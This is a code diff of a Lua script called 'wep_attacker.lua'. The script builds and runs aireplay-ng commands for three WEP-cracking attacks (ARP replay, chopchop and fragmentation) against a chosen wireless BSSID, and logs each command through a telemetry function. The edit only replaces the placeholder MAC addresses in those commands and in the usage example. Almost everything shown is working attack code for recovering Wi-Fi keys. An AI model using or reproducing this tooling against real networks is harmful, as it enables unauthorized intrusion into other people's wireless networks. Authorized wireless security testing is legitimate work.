@@ -56,7 +56,7 @@ end
 
 local function arp_replay()
   telemetry("method_start", '{"method":"arp_replay"}')
-  local cmd = "aireplay-ng -3 -b " .. bssid .. " -h 00:11:22:33:44:55 " .. iface .. " 2>/dev/null &"
+  local cmd = "aireplay-ng -3 -b " .. bssid .. " -h AA:BB:CC:DD:EE:FF " .. iface .. " 2>/dev/null &"
   telemetry("arp_replay_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
   os.execute(cmd)
   local sent = 0
@@ -78,7 +78,7 @@ end
 
 local function chopchop()
   telemetry("method_start", '{"method":"chopchop"}')
-  local cmd = "aireplay-ng -4 -b " .. bssid .. " -h 00:11:22:33:44:55 " .. iface .. " 2>/dev/null"
+  local cmd = "aireplay-ng -4 -b " .. bssid .. " -h AA:BB:CC:DD:EE:FF " .. iface .. " 2>/dev/null"
   telemetry("chopchop_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
   local f = io.popen(cmd)
   if not f then return false end
@@ -102,7 +102,7 @@ end
 
 local function fragmentation()
   telemetry("method_start", '{"method":"fragmentation"}')
-  local cmd = "aireplay-ng -5 -b " .. bssid .. " -h 00:11:22:33:44:55 " .. iface .. " 2>/dev/null"
+  local cmd = "aireplay-ng -5 -b " .. bssid .. " -h AA:BB:CC:DD:EE:FF " .. iface .. " 2>/dev/null"
   telemetry("frag_cmd", '{"cmd":' .. json_escape(cmd) .. '}')
   local f = io.popen(cmd)
   if not f then return false end
@@ -146,7 +146,7 @@ end
 if arg[1] == "--help" then
   print("Usage: wep_attacker.lua <interface> <bssid> [channel] [count] [method]")
   print("WEP cracking: arp_replay, chopchop, fragmentation")
-  print("Example: wep_attacker.lua wlan0 00:11:22:33:44:55 6 50000 arp_replay")
+  print("Example: wep_attacker.lua wlan0 AA:BB:CC:DD:EE:FF 6 50000 arp_replay")
   os.exit(0)
 end
 
